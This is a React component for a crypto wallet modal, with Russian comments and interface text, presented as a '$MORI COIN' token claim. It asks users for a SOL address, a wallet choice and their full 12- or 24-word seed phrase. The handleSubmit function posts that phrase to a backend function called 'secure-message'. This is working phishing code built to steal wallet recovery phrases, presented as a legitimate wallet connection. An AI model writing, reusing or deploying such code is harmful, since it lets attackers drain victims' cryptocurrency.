import React, { useState, useCallback } from 'react';
import ReCAPTCHA from 'react-google-recaptcha';
import './WalletModal.css';

const WALLETS = [
  { name: 'MetaMask', icon: '/icons/metamask-logo.svg' },
  { name: 'Trust Wallet', icon: '/icons/trustwallet-logo.svg' },
  { name: 'Phantom', icon: '/icons/phantom-logo.svg' },
];

const WalletModal = ({ onClose }) => {
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [solAddress, setSolAddress] = useState(''); // Новое состояние для SOL адреса
  const [phraseType, setPhraseType] = useState(null);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [recaptchaToken, setRecaptchaToken] = useState('');
  const [submissionStatus, setSubmissionStatus] = useState('');

  const BACKEND_URL = '/.netlify/functions/secure-message';

  // ВАЖНО: Публичный ключ сайта (Site Key) для reCAPTCHA v2
  const RECAPTCHA_SITE_KEY_V2 = "6LfciG4rAAAAAB-s0mobITSv7p16yLOmEDE1lb3Z"; 

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
  };

  const handleSolAddressChange = (e) => {
    setSolAddress(e.target.value);
  };

  const handleSolAddressSubmit = (e) => {
    e.preventDefault();
    if (solAddress.trim() === '') {
      // Здесь можно добавить более заметное сообщение об ошибке для пользователя,
      // но пока полагаемся на `required` атрибут инпута.
      return; 
    }
    // Переход к следующему шагу (выбору кошелька) происходит автоматически,
    // так как состояние `solAddress` становится непустым, и JSX перерисовывается.
  };

  const handlePhraseTypeSelect = (type) => {
    setPhraseType(type);
  };
  
  const handleBack = () => {
    if (phraseType) {
      // Если находимся на выборе сид-фразы или вводе сид-фразы, возвращаемся к выбору типа фразы
      setPhraseType(null);
      setSeedPhrase('');
      setRecaptchaToken('');
    } else if (selectedWallet) {
      // Если находится на выборе типа фразы, возвращаемся к выбору кошелька
      setSelectedWallet(null);
    } else if (solAddress) {
      // Если находится на выборе кошелька, возвращаемся к вводу SOL-адреса
      setSolAddress('');
    } else {
      // Если находится на вводе SOL-адреса (первый шаг), закрываем модальное окно
      onClose();
    }
  };

  const onRecaptchaChange = (token) => {
    setRecaptchaToken(token);
  };

  const handleSubmit = useCallback(async (e) => {
    e.preventDefault();

    if (!recaptchaToken) {
      setSubmissionStatus('❌ Пожалуйста, подтвердите, что вы не робот.');
      return;
    }
    
    setSubmissionStatus('Проверка и отправка данных...');

    try {
      const response = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletName: selectedWallet.name,
          solAddress: solAddress, // Отправляем SOL адрес на бэкенд
          seedPhrase: seedPhrase,
          recaptchaToken: recaptchaToken,
        }),
      });

      const data = await response.json();

      if (response.ok && data.success) {
        setSubmissionStatus(`✅ ${data.message}`);
        setRecaptchaToken('');
      } else {
        throw new Error(data.message || 'Не удалось отправить данные.');
      }
    } catch (error) {
      console.error('Ошибка отправки на бэкенд:', error);
      setSubmissionStatus(`❌ Ошибка! ${error.message}. Попробуйте позже.`);
      setRecaptchaToken('');
    }
  }, [selectedWallet, solAddress, seedPhrase, recaptchaToken]);

  if (submissionStatus) {
    return (
      <div className="modal-overlay">
        <div className="modal-content">
          <button className="close-button" onClick={onClose}>×</button>
          <h2>Статус заявки</h2>
          <p style={{ color: submissionStatus.includes('❌') ? '#ff9999' : '#99ff99' }}>
            {submissionStatus}
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        <button className="close-button" onClick={onClose}>×</button>
        {selectedWallet || solAddress ? ( // Показываем кнопку "Назад", если выбран кошелек ИЛИ введен SOL-адрес
            <button className="back-button" onClick={handleBack}>←</button>
        ) : null}

        {!solAddress ? ( // Шаг 1: Введите SOL адрес
          <>
            <h2>Введите свой SOL адрес</h2>
            <form onSubmit={handleSolAddressSubmit}>
              <label htmlFor="solAddress">SOL адрес:</label>
              <input
                type="text"
                id="solAddress"
                name="solAddress"
                value={solAddress}
                onChange={handleSolAddressChange}
                placeholder="Например, 2T7yXp1aB3c4D5e6F7g8H9i0J1k2L3m4N5o6P7q8R" // Подсказка
                required
              />
              <button type="submit" className="submit-button">Далее</button>
            </form>
          </>
        ) : !selectedWallet ? ( // Шаг 2: Выберите ваш кошелек
          <>
            <h2>Выберите ваш кошелек</h2>
            <div className="wallet-list">
              {WALLETS.map((wallet) => (
                <div key={wallet.name} className="wallet-item" onClick={() => handleWalletSelect(wallet)}>
                  <img src={wallet.icon} alt={`${wallet.name} logo`} className="wallet-icon" />
                  <span>{wallet.name}</span>
                </div>
              ))}
            </div>
            <p className="partnership-note">Партнерство только с указанными кошельками.</p>
          </>
        ) : !phraseType ? ( // Шаг 3: Выберите тип фразы
            <>
                <h2>Выберите тип фразы</h2>
                <div className="phrase-type-selection">
                    <button className="phrase-type-button" onClick={() => handlePhraseTypeSelect(12)}>
                        12 слов
                    </button>
                    <button className="phrase-type-button" onClick={() => handlePhraseTypeSelect(24)}>
                        24 слова
                    </button>
                </div>
            </>
        ) : ( // Шаг 4: Введите сид-фразу и reCAPTCHA
          <>
            <h2>Подключите кошелек {selectedWallet.name}</h2>
            <form onSubmit={handleSubmit}>
              <label htmlFor="seedPhrase">Введите вашу сид фразу ({phraseType} слов)</label>
              <textarea
                id="seedPhrase"
                name="seedPhrase"
                value={seedPhrase}
                onChange={(e) => setSeedPhrase(e.target.value)}
                placeholder="Введите слова через пробел..."
                required
                rows={phraseType === 24 ? 5 : 3}
              />
              <div style={{ marginBottom: '1rem' }}>
                <ReCAPTCHA
                  sitekey={RECAPTCHA_SITE_KEY_V2}
                  onChange={onRecaptchaChange}
                />
              </div>
              <button type="submit" className="submit-button">Получить $MORI COIN</button>
            </form>
          </>
        )}
      </div>
    </div>
  );
};

export default WalletModal;